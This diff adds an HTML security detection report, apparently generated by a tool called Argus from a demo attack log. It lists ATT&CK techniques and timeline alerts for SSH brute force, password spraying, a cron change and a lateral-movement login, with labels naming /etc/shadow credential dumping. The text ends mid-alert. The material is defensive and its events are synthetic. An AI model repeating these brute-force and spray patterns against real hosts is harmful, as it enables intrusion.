@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Argus Detection Report</title>
+<style>
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:#0d0d0d; color:#e0e0e0; font-family:'Segoe UI',system-ui,sans-serif; padding:2rem; max-width:1000px; margin:0 auto; }
+  .header { border-bottom:1px solid #222; padding-bottom:1.5rem; margin-bottom:2rem; }
+  .header h1 { font-size:1.6rem; font-weight:700; color:#fff; }
+  .header h1 span { color:#7c3aed; }
+  .meta { color:#555; font-size:.85rem; margin-top:.4rem; }
+  .stats { display:flex; gap:1.5rem; margin:1.5rem 0; flex-wrap:wrap; }
+  .stat { text-align:center; background:#111; border:1px solid #1e1e1e; border-radius:8px; padding:.8rem 1.2rem; }
+  .section-label { color:#555; font-size:.68rem; text-transform:uppercase; letter-spacing:.1em; margin:2rem 0 .8rem; }
+  .alert-row { background:#111; border-radius:6px; padding:1rem 1.1rem; margin-bottom:.6rem; }
+  .alert-header { display:flex; align-items:center; gap:.7rem; margin-bottom:.4rem; flex-wrap:wrap; }
+  .alert-title { font-weight:600; color:#f0f0f0; font-size:.9rem; }
+  footer { margin-top:3rem; color:#333; font-size:.75rem; border-top:1px solid #1a1a1a; padding-top:1rem; }
+</style>
+</head>
+<body>
+<div class="header">
+  <h1><span>Argus</span> Detection Report</h1>
+  <div class="meta">
+    Log: logs/demo_attack.log &nbsp;|&nbsp;
+    2026-05-13 22:54 UTC &nbsp;|&nbsp;
+    81 events processed &nbsp;|&nbsp;
+    25 alerts fired
+  </div>
+</div>
+
+<div class="stats">
+  <div class="stat"><span style="color:#ff4444;font-size:1.8rem;font-weight:700">2</span><br><span style="color:#888;font-size:.72rem;text-transform:uppercase">critical</span></div><div class="stat"><span style="color:#ff8800;font-size:1.8rem;font-weight:700">11</span><br><span style="color:#888;font-size:.72rem;text-transform:uppercase">high</span></div><div class="stat"><span style="color:#ffcc00;font-size:1.8rem;font-weight:700">12</span><br><span style="color:#888;font-size:.72rem;text-transform:uppercase">medium</span></div>
+  <div class="stat">
+    <span style="color:#e0e0e0;font-size:1.8rem;font-weight:700">25</span><br>
+    <span style="color:#888;font-size:.72rem;text-transform:uppercase">Total</span>
+  </div>
+  <div class="stat">
+    <span style="color:#e0e0e0;font-size:1.8rem;font-weight:700">81</span><br>
+    <span style="color:#888;font-size:.72rem;text-transform:uppercase">Events</span>
+  </div>
+</div>
+
+<div class="section-label">ATT&CK Coverage</div>
+<div style="display:flex;gap:.75rem;flex-wrap:wrap;margin:1.5rem 0"><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ff8800;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ff8800;font-size:1.3rem;font-weight:700">1</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Execution</div></div><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ff8800;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ff8800;font-size:1.3rem;font-weight:700">4</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Persistence</div></div><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ff8800;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ff8800;font-size:1.3rem;font-weight:700">3</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Privilege Escalation</div></div><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ff4444;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ff4444;font-size:1.3rem;font-weight:700">12</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Credential Access</div></div><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ff8800;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ff8800;font-size:1.3rem;font-weight:700">1</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Discovery</div></div><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ff4444;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ff4444;font-size:1.3rem;font-weight:700">1</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Lateral Movement</div></div><div style="background:#111;border:1px solid #1e1e1e;border-top:2px solid #ffcc00;border-radius:4px;padding:.6rem .9rem;text-align:center"><div style="color:#ffcc00;font-size:1.3rem;font-weight:700">3</div><div style="color:#666;font-size:.68rem;text-transform:uppercase;margin-top:.2rem">Command and Control</div></div></div>
+
+<div class="section-label">Techniques Detected</div>
+<div style="margin-bottom:1.5rem"><a href="https://attack.mitre.org/techniques/T1003/008/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow</a><a href="https://attack.mitre.org/techniques/T1021/004/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1021.004 — Remote Services: SSH</a><a href="https://attack.mitre.org/techniques/T1046/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1046 — Network Service Discovery</a><a href="https://attack.mitre.org/techniques/T1053/003/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1053.003 — Scheduled Task/Job: Cron</a><a href="https://attack.mitre.org/techniques/T1059/004/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1059.004 — Command and Scripting Interpreter: Unix Shell</a><a href="https://attack.mitre.org/techniques/T1071/001/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1071.001 — Application Layer Protocol: Web Protocols</a><a href="https://attack.mitre.org/techniques/T1110/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1110 — Brute Force</a><a href="https://attack.mitre.org/techniques/T1110/001/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1110.001 — Brute Force: Password Guessing</a><a href="https://attack.mitre.org/techniques/T1110/003/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1110.003 — Brute Force: Password Spraying</a><a href="https://attack.mitre.org/techniques/T1136/001/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1136.001 — Create Account: Local Account</a><a href="https://attack.mitre.org/techniques/T1548/003/" target="_blank" style="display:inline-block;background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:.25rem .6rem;font-size:.74rem;color:#7c3aed;text-decoration:none;margin:.2rem">T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching</a></div>
+
+<div class="section-label">Alert Timeline</div>
+
+<div class="alert-row" style="border-left:3px solid #ffcc00">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:00:30</span>
+    <span style="background:#ffcc00;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">medium</span>
+    <span class="alert-title">Cron Job Added or Modified</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1053/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1053.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Cron Job Added or Modified: user='root'</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:00:30</span> <span style="color:#555">cron_modified</span> <span style="color:#555">host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span>  <span style="color:#555">cron_file=</span><span style="color:#777">/etc/cron.d/backup</span>  <span style="color:#555">detail=</span><span style="color:#777">Added nightly backup job</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:03:52</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">SSH Brute Force</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1110.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">SSH Brute Force: 5+ events from src_ip='185.220.101.47' in 60s window (5 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:20</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">admin</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:28</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ubuntu</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:36</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:44</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:52</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ec2-user</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:04:00</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">SSH Brute Force</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1110.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">SSH Brute Force: 5+ events from src_ip='185.220.101.47' in 60s window (6 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:20</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">admin</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:28</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ubuntu</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:36</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:44</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:52</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ec2-user</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 1 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:04:08</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">SSH Brute Force</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/001/" style="color:#555;text-decoration:none" target="_blank">
+        T1110.001
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">SSH Brute Force: 5+ events from src_ip='185.220.101.47' in 60s window (7 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:20</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">admin</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:28</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ubuntu</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:36</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:44</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:52</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ec2-user</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 2 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff4444">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:04:30</span>
+    <span style="background:#ff4444;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">critical</span>
+    <span class="alert-title">SSH Lateral Movement Chain</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1021/004/" style="color:#555;text-decoration:none" target="_blank">
+        T1021.004
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">SSH Lateral Movement Chain: 2-step sequence completed for src_ip='185.220.101.47' over 70s</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:20</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">admin</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:04:30</span> <span style="color:#555">auth_success</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">deploy</span></div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:05:00</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Password Spray Attack</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1110.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Password Spray Attack: 8+ events from src_ip='185.220.101.47' in 120s window (8 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:20</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">admin</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:28</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ubuntu</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:36</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:44</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:52</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ec2-user</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 3 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:05:13</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Password Spray Attack</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1110.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Password Spray Attack: 8+ events from src_ip='185.220.101.47' in 120s window (9 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:20</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">admin</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:28</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ubuntu</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:36</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:44</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">root</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:03:52</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">ec2-user</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 4 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:06:57</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Password Spray Attack</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1110/003/" style="color:#555;text-decoration:none" target="_blank">
+        T1110.003
+      </a>
+    </span>
+  </div>
+  <div style="color:#666;font-size:.8rem;margin:.3rem 0">Password Spray Attack: 8+ events from src_ip='185.220.101.47' in 120s window (10 total)</div>
+  <div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:05:00</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">alice</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:05:13</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">bob</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:05:26</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">charlie</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:05:39</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">david</span></div><div style="font-family:monospace;font-size:.74rem;padding:.15rem 0;border-left:2px solid #1e1e1e;padding-left:.6rem;margin-top:.2rem"><span style="color:#444">02:05:52</span> <span style="color:#555">auth_failure</span> <span style="color:#555">service=</span><span style="color:#777">sshd</span>  <span style="color:#555">src_ip=</span><span style="color:#777">185.220.101.47</span>  <span style="color:#555">dest_host=</span><span style="color:#777">web-prod-01</span>  <span style="color:#555">user=</span><span style="color:#777">eve</span></div><div style="color:#444;font-size:.72rem;padding-left:.6rem">… 5 more events</div>
+</div>
+
+<div class="alert-row" style="border-left:3px solid #ff8800">
+  <div class="alert-header">
+    <span style="color:#444;font-size:.75rem;font-family:monospace;margin-right:.8rem">02:08:30</span>
+    <span style="background:#ff8800;color:#000;font-size:.62rem;font-weight:700;padding:.2em .5em;border-radius:3px;text-transform:uppercase;letter-spacing:.05em">high</span>
+    <span class="alert-title">Recon to Exploitation Chain - Port Scan Followed by Auth Attempt</span>
+    <span style="color:#333;font-size:.75rem;margin-left:auto">
+      <a href="https://attack.mitre.org/techniques/T1046/" style="color:#555;text-decoration:none" target="_blank">
+        T1046
+      </a>
+    </span>
+  </div>
